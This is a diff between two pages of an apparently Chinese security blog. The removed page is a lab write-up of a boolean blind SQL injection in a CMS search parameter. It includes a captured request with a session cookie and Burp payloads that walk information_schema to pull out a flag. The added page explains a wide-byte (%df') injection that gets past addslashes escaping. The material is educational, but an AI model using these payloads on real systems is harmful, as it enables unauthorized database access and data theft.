@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html><head>
-<title>中环 CMS 主页面存在 SQL 注入</title>
+<title>掌控安全靶场 pass-15</title>
 
 
 
@@ -10,26 +10,26 @@
 <meta name="google-site-verification" content="">
 <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
 <meta content="telephone=no" name="format-detection">
-<meta name="description" content="主页面搜索功能的 post 请求中搜索类型这个变量可以执行 sql 注入的恶意语句">
+<meta name="description" content="宽字节注入">
 <meta name="renderer" content="webkit">
 <meta name="theme-color" content="#ffffff">
 
 
 
-<meta property="og:title" content="中环 CMS 主页面存在 SQL 注入" />
-<meta property="og:description" content="主页面搜索功能的 post 请求中搜索类型这个变量可以执行 sql 注入的恶意语句" />
+<meta property="og:title" content="掌控安全靶场 pass-15" />
+<meta property="og:description" content="宽字节注入" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://xxxhidexxx.github.io/posts/sec/sqli7/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2024-02-19T00:00:00+00:00" />
-<meta property="article:modified_time" content="2024-02-19T00:00:00+00:00" /><meta property="og:site_name" content="My Blog" />
+<meta property="og:url" content="https://xxxhidexxx.github.io/posts/sec/sqli8/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-03-06T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-03-06T00:00:00+00:00" /><meta property="og:site_name" content="My Blog" />
 
 
 
 
 
 
-<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="中环 CMS 主页面存在 SQL 注入"/>
-<meta name="twitter:description" content="主页面搜索功能的 post 请求中搜索类型这个变量可以执行 sql 注入的恶意语句"/>
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="掌控安全靶场 pass-15"/>
+<meta name="twitter:description" content="宽字节注入"/>
 
 
 
@@ -137,61 +137,6 @@
             <div class="toc">
 
 
-	<div class="toc-content">
-	
-		
-		
-		
-		<center>- CATALOG -</center>
-		
-		
-		<ul>
-			
-				
-				
-					
-						
-						
-						
-						
-							
-								
-									<ul>
-								
-							
-						
-						
-							<li>
-								<a href="#%e6%b3%a8%e5%85%a5%e7%82%b9" class="nav-注入点">
-									注入点
-								</a>
-							</li>
-						
-						
-					
-				
-			
-				
-				
-					
-						
-						
-						
-						
-						
-							<li>
-								<a href="#%e7%88%86%e7%a0%b4" class="nav-爆破">
-									爆破
-								</a>
-							</li>
-						
-						
-					
-				
-			
-		</ul>
-	</div>
-
 </div>
             
         </div>
@@ -242,16 +187,16 @@
                 
             >
                 <div class="post-title">
-                    中环 CMS 主页面存在 SQL 注入
+                    掌控安全靶场 pass-15
                     
                     <div class="post-subtitle">
-                        主页面搜索功能的 post 请求中搜索类型这个变量可以执行 sql 注入的恶意语句
+                        宽字节注入
                     </div>
                     
                     <div class="post-meta">
                         
                         <time itemprop="datePublished">
-                            2024-02-19 00:00
+                            2024-03-06 00:00
                         </time>
                         
 
@@ -280,56 +225,17 @@
                 
                 <div class="post-body" v-pre>
                 
-                    <h2 id="注入点">注入点</h2>
-<p>第一次见到这种注入点。我们在搜索框输入 t 然后抓包，这是为了保证返回的搜索内容不为空。</p>
-<p><img src="/images/sqli1/sqli7-4.png" alt="sqli7"></p>
-<p>发现 sertype 变量在加入恒真恒伪后提供了一个布尔盲注点位。</p>
-<pre><code>POST /index.php/index/search HTTP/1.1
-Host: 111.9.41.91:53009
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate, br
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 140
-Origin: http://111.9.41.91:53009
-Connection: close
-Referer: http://111.9.41.91:53009/index.php/index/search
-Cookie: admin=admin; pass=21232f297a57a5a743894a0e4a801fc3; PHPSESSID=0gficahl2rfqurrer05uhkdv96
-Upgrade-Insecure-Requests: 1
-
-sertype=1 and 1=2;#&amp;search=t&amp;sub=%E6%90%9C%E7%B4%A2
-</code></pre>
-<p><img src="/images/sqli1/sqli7-5.png" alt="sqli7"></p>
-<h2 id="爆破">爆破</h2>
-<p>开 burp 爆破。</p>
-<p>构造如下 payload。</p>
-<pre><code>1 and ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=100;# 
-
-1 and ascii(substr((select table_name from information_schema.tables where table_schema='flag_db' limit 0,1),1,1))=1;#  
-
-1 and ascii(substr((select column_name from information_schema.columns where table_schema='flag_db' and table_name='flag' limit 0,1),1,1))=1;#  
-
-1 and ascii(substr((select value from flag_db.flag limit 0,1),1,1))=1;#  
-</code></pre>
-<p>其中 burp 的 payload 位置如下。</p>
-<pre><code>1 and ascii(substr((select schema_name from information_schema.schemata limit $0$,1),$1$,1))=$1$;# 
-</code></pre>
-<p>得到如下结果。</p>
-<p>102 108 97 103 95 100 98 flag_db</p>
-<p>102 108 97 103 flag</p>
-<p>105 100 id 118 97 108 117 101 value</p>
-<p>121 119 97 113 123 73 104 122 120 100 73 72 71 115 106 125 ywaq{IhzxdIHGsj}</p>
-<p>得到 flag=ywaq{IhzxdIHGsj}。</p>
-<p>其中 burp 结果如下图所示。</p>
-<p><img src="/images/sqli1/sqli7-1.png" alt="sqli7"></p>
-<p><img src="/images/sqli1/sqli7-0.png" alt="sqli7"></p>
-<p><img src="/images/sqli1/sqli7-2.png" alt="sqli7"></p>
-<p><img src="/images/sqli1/sqli7-3.png" alt="sqli7"></p>
+                    <p>起因。网站开发防止 SQL 注入添加了 PHP 函数：addslashes()。php语言中的addslashes()函数在指定的预定义字符前添加反斜杠，这些字符是单引号(&rsquo;)，双引号(&quot;)，反斜线（\）与NUL（NULL字符）。例如客户端提交的参数中如果含有单引号，双引号等这些特殊字符，addslashes 函数则会在单引号前加反斜线“\”，将单引号转义成没有功能性的字符。</p>
+<p>构造 payload：
+%df&rsquo; or 1=1 &ndash; qwe
+%df&rsquo; or 1=0 &ndash; qwe</p>
+<p>则 %df' 被十六进制编码变为 %df%5c%27，而 df5c 被 gbk 编码变为汉字“运”，从而单引号 %27 被解析。</p>
+<p>绕过这个斜杠之后，这个靶场剩下的部分是走流程用 union 读取 flag，此处从略。</p>
+<p><img src="/images/sqli1/sqli8-0.png" alt="sqli8"></p>
 
                     
                     <HR width="100%" id="EOF">
-		    <p style="color:#777;">Last modified on 2024-02-19</p>
+		    <p style="color:#777;">Last modified on 2024-03-06</p>
                     
                 </div>
             </div>
@@ -338,14 +244,14 @@ sertype=1 and 1=2;#&amp;search=t&amp;sub=%E6%90%9C%E7%B4%A2
             <nav class="post-pagination">
 
                 
-                <a class="newer-posts" href="/posts/sec/sqli8/">
-			Next<br>掌控安全靶场 pass-15
+                <a class="newer-posts" href="/posts/sec/sqli9/">
+			Next<br>SQL 注入绕 WAF
                 </a>
                 
                 
                 
-                <a class="older-posts" href="/posts/sec/sqli6/">
-			Previous<br>禅道 PMS 用户登录存在 SQL 注入
+                <a class="older-posts" href="/posts/sec/sqli7/">
+			Previous<br>中环 CMS 主页面存在 SQL 注入
                 </a>
                 
             </nav>
@@ -419,61 +325,6 @@ Ported from <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopene
         
         <div class="toc">
 
-
-	<div class="toc-content">
-	
-		
-		
-		
-		<center>- CATALOG -</center>
-		
-		
-		<ul>
-			
-				
-				
-					
-						
-						
-						
-						
-							
-								
-									<ul>
-								
-							
-						
-						
-							<li>
-								<a href="#%e6%b3%a8%e5%85%a5%e7%82%b9" class="nav-注入点">
-									注入点
-								</a>
-							</li>
-						
-						
-					
-				
-			
-				
-				
-					
-						
-						
-						
-						
-						
-							<li>
-								<a href="#%e7%88%86%e7%a0%b4" class="nav-爆破">
-									爆破
-								</a>
-							</li>
-						
-						
-					
-				
-			
-		</ul>
-	</div>
 
 </div>
         
